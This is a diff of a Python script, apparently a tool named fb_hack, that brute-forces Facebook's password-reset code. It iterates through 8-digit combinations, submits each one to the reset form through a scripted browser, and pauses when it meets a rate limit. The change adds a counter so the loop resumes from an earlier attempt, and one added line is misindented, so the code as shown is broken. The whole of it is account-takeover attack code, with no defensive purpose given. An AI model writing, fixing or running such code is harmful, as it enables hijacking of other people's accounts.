@@ -102,17 +102,20 @@ def fb_hack(email, codex):
     print(check2)
     for combination in itertools.product(range(10), repeat=8):
       y = str(''.join(map(str, combination)))
-      print(y)
-      browser.select_form(nr=0)
-      browser.set_value(str(y), nr=5)
-      browser.submit()
-      response1 = browser.response()
-      soup = BeautifulSoup(response1, 'html.parser')
-      soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
-      if check1 != test:
-        sleepy(30)
+            if attempt1 <= attempt2:
+        attempt1 += 1
       else:
-        break
+        print(y)
+        browser.select_form(nr=0)
+        browser.set_value(str(y), nr=5)
+        browser.submit()
+        response1 = browser.response()
+        soup = BeautifulSoup(response1, 'html.parser')
+        soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
+        if check1 != test:
+          sleepy(30)
+        else:
+          break
   else:
     response1 = browser.response()
     soup = BeautifulSoup(response1, 'html.parser')
